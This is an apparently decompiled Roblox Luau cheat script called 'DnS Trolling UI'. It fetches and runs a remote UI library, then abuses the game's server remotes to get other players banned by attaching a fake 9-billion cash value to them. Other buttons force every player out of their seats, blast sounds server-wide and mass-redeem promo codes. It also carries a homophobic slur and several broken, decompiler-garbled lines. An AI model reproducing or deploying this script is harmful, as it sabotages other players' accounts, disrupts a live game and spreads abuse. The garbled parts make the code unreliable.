local fenv = getfenv()
local _get_hidden_gui2 = fenv.get_hidden_gui
CHECKIF(_get_hidden_gui2)
CHECKIF(_get_hidden_gui2)
_get_hidden_gui2()
local _ = game:GetService("RunService").IsStudio
local _10 = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/idonthaveoneatm/darius/refs/heads/main/bundled.luau"))()
local _call20 = _10:Window({
    IsMobile = game:GetService("UserInputService").TouchEnabled,
    Workspace = "mainWorkspace",
    Description = "Developed by the sigmaboyskibdi",
    HideBind = Enum.KeyCode.T,
    Parent = game.Players.LocalPlayer.PlayerGui,
    UseConfig = false,
    Icon = "",
    Title = "DnS Trolling UI",
})
local _call22 = _call20:Tab({
    Name = "Main Tab",
    Image = "",
})
_call22:Label("Bans users when they leave the server!")
_call22:Button({
    Name = "Ban other users",
    Callback = function(...)
        local _LocalPlayer30 = game:GetService("Players").LocalPlayer
        for _35, _35_2 in game:GetService("Players"):GetPlayers() do
            local _ = _35_2 ~= _LocalPlayer30
            local _ = _35_2 == _LocalPlayer30
            for _40, _40_2 in _35_2:GetDescendants() do
                local _ = not _40_2:IsA("NumberValue")
                game:GetService("ReplicatedStorage").Remotes.RecieveOnHoldCash:FireServer({
                    Value = 9000000000,
                    Instance = {
                        stats = {
                            OnHoldCash = _40_2,
                        },
                    },
                })
            end
        end
        _10:Notify({
            Duration = 15,
            Title = "Ban Panel",
            Body = "All users will be auto banned when they leave the game!",
        })
    end,
})
_call22:Divider()
_call22:TextBox({
    OnLeave = false,
    IgnoreConfig = true,
    PlaceHolderText = "000000",
    Default = "126733639137243",
    ClearTextOnFocus = true,
    FLAG = "AUDIO_TEXTBOX",
    OnlyNumbers = true,
    Name = "Enter AudioId",
    Callback = function(...)
    end,
})
_call22:Button({
    Name = "Play audio",
    Callback = function(...)
        for _62, _62_2 in workspace:GetDescendants() do
            local _ = not _62_2:IsA("Sound")
            game:GetService("ReplicatedStorage").Remotes.PlaySound:FireServer({
                PlayOrNah = true,
                AudioId = "rbxassetid://nil",
                Sound = _62_2,
                Volume = 10,
            })
        end
        _10:Notify({
            Duration = 5,
            Title = "Audio",
            Body = "Now playing rbxassetid://nil",
        })
    end,
})
_call22:Divider()
_call22:Button({
    Name = "Redeem Codes",
    Callback = function(...)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("HAPPY10MVISITS")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming HAPPY10MVISITS",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("HAPPY20MVISITS")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming HAPPY20MVISITS",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("BOSSREI")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming BOSSREI",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("BIGUPDATE!")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming BIGUPDATE!",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("DNSNUMBAWAN")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming DNSNUMBAWAN",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("PLSMONEY")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming PLSMONEY",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("SWEETPOTATOLOVER")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming SWEETPOTATOLOVER",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("DNSxMNLR21")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming DNSxMNLR21",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("PISO")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming PISO",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("PARZIGAMING")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming PARZIGAMING",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("SIOPASH")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming SIOPASH",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("SUB2DAVEFROMPH")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming SUB2DAVEFROMPH",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("SUB2BOYIMBO")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming SUB2BOYIMBO",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("WHOSEVIL?")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming WHOSEVIL?",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("TEX")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming TEX",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("HIROMI")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming HIROMI",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("JAMDELABUSE")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming JAMDELABUSE",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("MERVIN#1")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming MERVIN#1",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("AoiTheInvestor")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming AoiTheInvestor",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("JAMBOHATDOGKAYAMOBATO")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming JAMBOHATDOGKAYAMOBATO",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("CADEZ")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming CADEZ",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("HAPPYXMAS2025")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming HAPPYXMAS2025",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("BERMONTHS2025")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming BERMONTHS2025",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("LONGJEEP")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming LONGJEEP",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("HAPPY25MVISITS")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming HAPPY25MVISITS",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("KAMOTE")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming KAMOTE",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("BUGFIXES")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming BUGFIXES",
        })
        task.wait(0.45)
        game:GetService("ReplicatedStorage").codeEvent:FireServer("tres")
        _10:Notify({
            Duration = 5,
            Title = "Codes",
            Body = "Redeeming tres",
        })
        task.wait(0.45)
    end,
})
_call22:Divider()
_call22:TextBox({
    OnLeave = false,
    IgnoreConfig = true,
    PlaceHolderText = "HACKED BY GAY FURRY HACKERS UWU",
    Default = "HACKED BY GAY FURRY HACKERS UWU",
    ClearTextOnFocus = true,
    FLAG = "NPC_TEXT",
    OnlyNumbers = false,
    Name = "NPC Text",
    Callback = function(...)
    end,
})
_call22:Button({
    Name = "Make NPC's Chat",
    Callback = function(...)
        for _285, _285_2 in workspace:GetDescendants() do
            local _ = _285_2.Name ~= "VoiceOverBoundBox"
        end
        _10:Notify({
            Duration = 5,
            Title = "NPC Chat",
            Body = "Made all npc's chat: " .. _279_vararg1,
        })
    end,
})
_call22:Divider()
_call22:Button({
    Name = "Unsit All",
    Callback = function(...)
        for _299, _299_2 in game:GetService("Players"):GetPlayers() do
            game:GetService("ReplicatedStorage").Remotes.UnSeatPlayer:FireServer({
                Player = _299_2,
                IsKicked = true,
                Jeepney = {
                    Name = "Gay furry hacker OwO\n\nFaggots on top!",
                },
            })
        end
        _10:Notify({
            Duration = 5,
            Title = "Script",
            Body = "Made all players unsit",
        })
    end,
})
_call22:Divider()
